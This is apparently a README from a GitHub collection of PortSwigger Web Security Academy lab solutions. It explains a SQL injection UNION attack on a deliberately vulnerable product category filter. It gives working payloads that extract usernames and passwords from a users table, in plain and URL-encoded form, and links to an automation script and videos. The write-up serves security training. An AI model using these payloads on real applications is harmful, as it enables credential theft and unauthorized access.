# Lab 5: SQL injection UNION attack, retrieving data from other tables

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Solution
> Manual:
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: ```'+UNION+SELECT+'abc','def'--```
3. Use the following payload to retrieve the contents of the users table: ```'+UNION+SELECT+username,+password+FROM+users--```
4. erify that the application's response contains usernames and passwords.

> Scripting the attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/Lab-05/sqli-lab-05.py)


## Payload

- Normal: ```' UNION SELECT username, password from users--```

- URL-Encoded: ```%27+UNION+SELECT+username,+password%20from%20users%20--```

### Video Solution
1. Manual: [Rana Khalil's Youtube video](https://youtu.be/6Dsj5SqR944)
2. Automating: [Rana Khalil's Youtube video](https://www.youtube.com/watch?v=4sBdD6I7fZI&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=6)

